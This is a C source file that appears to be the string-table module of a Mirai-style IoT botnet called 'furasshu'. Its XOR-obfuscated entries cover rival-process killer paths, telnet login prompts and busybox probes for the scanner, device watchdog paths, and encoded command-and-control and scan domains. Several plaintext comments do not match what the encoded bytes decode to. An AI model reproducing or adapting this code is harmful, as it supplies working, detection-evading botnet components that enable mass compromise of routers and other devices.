#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdeaddaad;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_EXEC_SUCCESS, "\x62\x76\x61\x61\x70\x65\x7D\x6F\x04", 9); // freetayk

    add_entry(TABLE_KILLER_PROC, "\x2B\x74\x76\x6B\x67\x2B\x04", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\x2B\x61\x7C\x61\x04", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\x2B\x62\x60\x04", 4); // /fd
	add_entry(TABLE_KILLER_MAPS, "\x2B\x69\x6A\x70\x04", 6); // /maps
    add_entry(TABLE_KILLER_STATUS, "\x2B\x77\x70\x65\x70\x71\x77\x04", 8); // /status
    add_entry(TABLE_KILLER_TCP, "\x2B\x74\x76\x6B\x67\x2B\x6A\x61\x70\x2B\x70\x67\x74\x04", 14); // /proc/net/tcp
    add_entry(TABLE_KILLER_CMDLINE, "\x2B\x67\x69\x60\x68\x6D\x6A\x61\x04", 9); // /cmdline
    add_entry(TABLE_KILLER_TMP, "\x2B\x70\x69\x74\x2B\x04", 6); // tmp/
    add_entry(TABLE_KILLER_DATALOCAL, "\x2B\x60\x65\x70\x65\x2B\x68\x6B\x67\x65\x68\x2B\x70\x69\x74\x04", 16); // data/local
    add_entry(TABLE_KILLER_QTX, "\x75\x70\x7C\x66\x6B\x70\x04", 7); // qtxbot
    add_entry(TABLE_KILLER_DOT, "\x2A\x04", 2); // .
    add_entry(TABLE_KILLER_ARM, "\x65\x76\x69\x04", 4); // arm
    add_entry(TABLE_KILLER_X86, "\x7C\x3C\x32\x04", 4); // x86
    add_entry(TABLE_KILLER_SH4, "\x77\x6C\x30\x04", 4); // sh4
    add_entry(TABLE_KILLER_MIPS, "\x69\x6D\x74\x77\x04", 5); // mips
    add_entry(TABLE_KILLER_MPSL, "\x69\x74\x77\x68\x04", 5); // mpsl
    add_entry(TABLE_KILLER_SDA, "\x77\x60\x65\x04", 4); // sda
    add_entry(TABLE_KILLER_MTD, "\x69\x70\x60\x04", 4); // mtd
	add_entry(TABLE_KILLER_QTX2, "\x66\x6B\x70\x26\x59\x04", 6); // bot"]
	add_entry(TABLE_KILLER_HAKAI, "\x6C\x65\x6F\x65\x6D\x04", 6); // hakai

    add_entry(TABLE_SCAN_SHELL, "\x77\x6C\x61\x68\x68\x04", 6); // shell
    add_entry(TABLE_SCAN_ENABLE, "\x61\x6A\x65\x66\x68\x61\x04", 7); // enable
    add_entry(TABLE_SCAN_SYSTEM, "\x77\x7D\x77\x70\x61\x69\x04", 7); // system
    add_entry(TABLE_SCAN_SH, "\x77\x6C\x04", 3); // sh
	add_entry(TABLE_SCAN_LSHELL, "\x68\x6D\x6A\x71\x7C\x77\x6C\x61\x68\x68\x04", 11); // linuxshell
    add_entry(TABLE_SCAN_QUERY, "\x2B\x66\x6D\x6A\x2B\x66\x71\x77\x7D\x66\x6B\x7C\x24\x42\x48\x45\x57\x4C\x04", 19); // /bin/busybox FLASH
    add_entry(TABLE_SCAN_RESP, "\x42\x48\x45\x57\x4C\x3E\x24\x65\x74\x74\x68\x61\x70\x24\x6A\x6B\x70\x24\x62\x6B\x71\x6A\x60\x04", 24); // FLASH: applet not found
    add_entry(TABLE_SCAN_NCORRECT, "\x6A\x67\x6B\x76\x76\x61\x67\x70\x04", 9); // ncorrect
    add_entry(TABLE_SCAN_OGIN, "\x6B\x63\x6D\x6A\x04", 5); // ogin
    add_entry(TABLE_SCAN_ASSWORD, "\x65\x77\x77\x73\x6B\x76\x60\x04", 8); // assword
    add_entry(TABLE_SCAN_ENTER, "\x61\x6A\x70\x61\x76\x04", 6); // enter

    add_entry(TABLE_WATCHDOG_1, "\x2B\x60\x61\x72\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 14); // /dev/watchdog
    add_entry(TABLE_WATCHDOG_2, "\x2B\x60\x61\x72\x2B\x69\x6D\x77\x67\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 19); // /dev/misc/watchdog
    add_entry(TABLE_WATCHDOG_3, "\x2B\x77\x66\x6D\x6A\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 15); // /sbin/watchdog
    add_entry(TABLE_WATCHDOG_4, "\x2B\x66\x6D\x6A\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 14); // /bin/watchdog
    add_entry(TABLE_WATCHDOG_5, "\x2B\x60\x61\x72\x2B\x42\x50\x53\x40\x50\x35\x34\x35\x5B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 23); // /dev/FTWDT101_watchdog
    add_entry(TABLE_WATCHDOG_6, "\x2B\x60\x61\x72\x2B\x42\x50\x53\x40\x50\x35\x34\x35\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 23); // /dev/FTWDT101/watchdog
    add_entry(TABLE_WATCHDOG_7, "\x2B\x60\x61\x72\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x34\x04", 15); // /dev/watchdog0
    add_entry(TABLE_WATCHDOG_8, "\x2B\x61\x70\x67\x2B\x60\x61\x62\x65\x71\x68\x70\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 22); // /etc/default/watchdog
    add_entry(TABLE_WATCHDOG_9, "\x2B\x61\x70\x67\x2B\x73\x65\x70\x67\x6C\x60\x6B\x63\x04", 14); // /etc/watchdog

    add_entry(TABLE_RANDOM, "\x65\x66\x67\x60\x61\x62\x63\x6C\x6D\x6E\x6F\x6A\x69\xC7\xB5\x68\x6B\x74\x75\x76\x77\x70\x72\x73\x7C\x7D\x7E\x35\x36\x37\x30\x31\x32\x33\x3C\x3D\x34\x41\x48\x4B\x4C\x41\x48\x04", 44);
    add_entry(TABLE_CNC_DOMAIN, "\x67\x6A\x67\x2A\x6D\x77\x6D\x77\x6A\x61\x70\x2A\x7C\x7D\x7E\x04", 16); // cnc.Insomniak.xyz
    add_entry(TABLE_SCAN_DOMAIN, "\x77\x67\x65\x6A\x2A\x6D\x77\x6D\x77\x6A\x61\x70\x2A\x7C\x7D\x7E\x04", 17); // scan.Insomniak.xyz
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("(furasshu/table) tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("(furasshu/table) tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("(furasshu/table) tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
